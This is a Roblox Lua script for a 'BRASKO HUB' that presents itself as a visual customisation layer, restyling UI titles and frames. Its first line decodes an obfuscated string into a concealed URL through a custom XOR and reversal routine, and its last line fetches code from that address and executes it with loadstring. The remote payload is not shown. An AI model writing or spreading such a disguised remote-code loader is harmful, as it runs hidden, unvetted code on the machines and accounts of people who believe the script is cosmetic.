
--[[ STAGE 2: VISUAL CORE ]]
local ButqyrT_upByUYd="\104\088\099\169\163\121\172\132\175\180\188\144\094\152\162\149\148\162\130\122\229\241\237\249\240\185\150\213\196\179\166\217\222\200\182\040\190\246\000\000\249\013\003\012\024\245\230\032\027\045\048\031\010\114\053\060\072\064\134\071\075\092\078\094\106\100\097\117\174\119\114\121\136\128\140\136\152\145\150\153\222\160\166\182\237\167\181\192\179\193\198\214\201\216\210\208\233\216\231\223\240\250\053\242\008\253\070\074\065\014\015\015\019\035"local c6XzjO5kUTCE2wBv=92 local rsyS6SsAFCegRN=34 local APIT2n8khxNl=0 local UhZBy737coqm=4 local lIW95klAkpQj_j=5 local RjYlJFOQkpvePvZ=true local I5PeTcRZPE_q=bit32 and bit32.bxor if not I5PeTcRZPE_q then I5PeTcRZPE_q=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local q5r8VBcJqqpcF_dh429wrh={}for YIp4BVtq8_e4SBSaDV=1,#ButqyrT_upByUYd do local TINuHDJIwY2FF9x=string.byte(ButqyrT_upByUYd,YIp4BVtq8_e4SBSaDV)local gjvAkwckOnib=(rsyS6SsAFCegRN+(YIp4BVtq8_e4SBSaDV*UhZBy737coqm)+lIW95klAkpQj_j)%256 if APIT2n8khxNl==0 then TINuHDJIwY2FF9x=(TINuHDJIwY2FF9x-gjvAkwckOnib)%256 q5r8VBcJqqpcF_dh429wrh[YIp4BVtq8_e4SBSaDV]=string.char(I5PeTcRZPE_q(TINuHDJIwY2FF9x,c6XzjO5kUTCE2wBv))else TINuHDJIwY2FF9x=I5PeTcRZPE_q(TINuHDJIwY2FF9x,c6XzjO5kUTCE2wBv)q5r8VBcJqqpcF_dh429wrh[YIp4BVtq8_e4SBSaDV]=string.char((TINuHDJIwY2FF9x-gjvAkwckOnib)%256)end end local rHS23Bm5cemkrShfbIH=table.concat(q5r8VBcJqqpcF_dh429wrh)if RjYlJFOQkpvePvZ then rHS23Bm5cemkrShfbIH=string.reverse(rHS23Bm5cemkrShfbIH)end local j4IuIGVzJFScgNyeGJA5R=rHS23Bm5cemkrShfbIH
local HubName = "BRASKO HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(j4IuIGVzJFScgNyeGJA5R))()
